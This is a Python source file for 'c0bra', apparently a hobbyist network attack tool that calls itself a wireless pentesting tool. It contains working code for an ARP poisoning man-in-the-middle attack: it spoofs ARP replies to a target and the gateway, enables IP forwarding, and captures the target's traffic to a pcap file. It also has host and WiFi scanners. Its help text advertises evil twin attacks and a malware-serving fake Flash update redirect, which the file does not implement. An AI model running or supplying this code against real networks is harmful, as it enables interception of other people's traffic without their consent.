#!/usr/bin/python

from wifi import Cell, Scheme
from colored import fg, attr
from scapy.all import *
import netifaces
import getpass
import time
import nmap
import sys

global QUESTION_ICON
global GREEN_ICON
global BLUE_ICON
global RED_ICON
global GATEWAY
global NM

QUESTION_ICON = "%s[?]%s" % (fg(12) , attr(0))
GREEN_ICON    = "%s[+]%s" % (fg(172), attr(0))
BLUE_ICON     = "%s[*]%s" % (fg(56) , attr(0))
RED_ICON      = "%s[!]%s" % (fg(1)  , attr(0))
GATEWAY       = netifaces.gateways()["default"][netifaces.AF_INET][0]
NM            = nmap.PortScanner()

def get_mac(ip_address):
	responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = ip_address), timeout = 2,
	retry = 10, verbose = False)

	for s, r in responses:
		return r[Ether].src
		
		
def arp_poisoning(target, target_mac, gateway_mac, plugin, interface):
	#PLUGIN CHECK
	if plugin == "-n":
		plugin = "NONE"
		
	elif plugin == "-w":
		plugin =  "VISITED SITES SNIFFER"
	
	elif plugin == "-p":
		plugin = "PICTURES SNIFFER"	
	
	else:
		print("%s ERROR : PLUGIN '%s' NOT FOUND") % (RED_ICON, plugin)
		sys.exit(1)
	
		
		
	#CHECK IF TARGET IS UP
	try:
		NM.scan(hosts = target, arguments = "-sP")
			
		if NM[target].state() == "up":
			pass
	except KeyError:
		print("%s ERROR : HOST '%s' IS DOWN") % (RED_ICON, target)
		sys.exit(1)
	
	
	
	#IP FORWARD
	f = open("/proc/sys/net/ipv4/ip_forward", "w")
	f.write("1")
	f.close()
	
	print("%s GATEWAY : %s\t| MAC : %s") % (BLUE_ICON, GATEWAY, gateway_mac)
	print("%s TARGET  : %s\t| MAC : %s") % (BLUE_ICON, target, target_mac)
	print("%s PLUGIN  : %s")             % (BLUE_ICON, plugin)
	
	poison_target       = ARP()
	poison_target.op    = 2
	poison_target.psrc  = GATEWAY
	poison_target.pdst  = target
	poison_target.hwdst = target_mac
	
	poison_gateway       = ARP()
	poison_gateway.op    = 2
	poison_gateway.psrc  = target
	poison_gateway.pdst  = GATEWAY
	poison_gateway.hwdst = gateway_mac
	
	print("%s ATTACK STARTED, FOR STOP TYPE 'CTRL + C'") % GREEN_ICON
	while 1:
		try:
			send(poison_target,  verbose = False)
			send(poison_gateway, verbose = False)
			
			cbr_filter = "ip host %s" % target
			packets    = sniff(count = 1000, filter = cbr_filter, iface = interface)
			
			if plugin == "NONE":
				wrpcap("arp_poisoning.pcap", packets)
			
			time.sleep(2)			
		except KeyboardInterrupt:
			print("\n%s EXIT") % RED_ICON
			
			f = open("/proc/sys/net/ipv4/ip_forward", "w")
			f.write("0")
			f.close()
						
			sys.exit()

def check_root():
	username = getpass.getuser()
	
	if username != "root":
		print("%s ERROR : YOU MUST BE A ROOT TO RUN THIS SCRIPT") % RED_ICON
		sys.exit(1)
	else:
		pass


def live_hosts():
	all_network = GATEWAY + "/24"
		
	print("%s LIVE HOSTS SCANNING STARTED") % BLUE_ICON
	print("%s GATEWAY    : %s")             % (BLUE_ICON, GATEWAY)
	print("%s LIVE HOSTS : ")               % BLUE_ICON   
		
	NM.scan(hosts = all_network, arguments = "-sP")
	for host in NM.all_hosts():
		print("\t%s %s \t%s") % (GREEN_ICON, host, NM[host].hostname())


def help():
	print("""
%s ARGUMENTS:
1) --live-hosts                                  = scan network for live hosts
2) --arp-poisoning <TARGET> <PLUGIN> <INTERFACE> = arp poisoning attack
3) --evil-twin <NETWORK_SSID> <INTERFACE>        = evil twin attack
4) --rediect-flash <target> <maleware>           = rediect to fake flash update page 

\t%s ARP POISONING ARGUMENTS:
\t -n = none
\t -p = pictures sniffer          [SOON]
\t -w = visited websites sniffer  [SOON]
	""") % (BLUE_ICON,
			BLUE_ICON)


def check_arguments():
	if len(sys.argv) < 2:
		print("%s ERROR : NO ARGUMENTS, TYPE '--help' FOR HELP") % RED_ICON
	
	elif sys.argv[1] == "--live-hosts":
		live_hosts()
		
	elif sys.argv[1] == "--arp-poisoning":
		try:
			target      = sys.argv[2]
			plugin      = sys.argv[3]
			interface   = sys.argv[4]
			target_mac  = get_mac(target)
			gateway_mac = get_mac(GATEWAY)
			
			arp_poisoning(target, target_mac, gateway_mac, plugin, interface)
		except IndexError:
			print("%s USAGE : ./c0bra.py <TARGET> <PLUGIN> <INTERFACE>") % RED_ICON

	elif sys.argv[1] == "--networks-scan":
		try:
			interface = sys.argv[2]
			network_scan(interface)
		except IndexError:
			print("%s USAGE : ./c0bra.py <INTERFACE>") % RED_ICON

	elif sys.argv[1] == "--help":
		help()
		
	else:
		print("%s ERROR : ARGUMENT NOT FOUND!") % RED_ICON
	

def banner():
	print("""
######################################
#                                    #
#        %s--- [ c0bra ] ---%s           #
#                                    #
#     %sWirless Pentesting tool%s        #
#                                    #
#         %sCode by : v4der%s            #
#                                    #
#          %sVERSION : 0.1%s             #
#                                    #
######################################
""") % (fg(1)  , attr(0),
        fg(56) , attr(0),
        fg(239), attr(0),
        fg(125), attr(0))


def network_scan(interface):
	print("%s NETWORK SCAN STARTED") % BLUE_ICON
	
	networks = Cell.all(interface)
	for network in networks:
		print("%s SSID   : %s") % (BLUE_ICON, network.ssid)
		print("%s BSSID  : %s") % (BLUE_ICON, network.address)
		print("%s SIGNAL : %s") % (BLUE_ICON, network.signal)
		print("%s ENC    : %s") % (BLUE_ICON, network.encryption_type)
		print("%s CH     : %s") % (BLUE_ICON, network.channel)
		print("%s MODE   : %s") % (BLUE_ICON, network.mode)

		print("\n\n")
	
	print("%s NETWORKS FOUND %s") % (GREEN_ICON, len(networks))
	
	
#####################
### PROGRAM START ###
#####################

def main():
	banner()
	check_root()
	check_arguments()

if __name__ == "__main__":
	main()
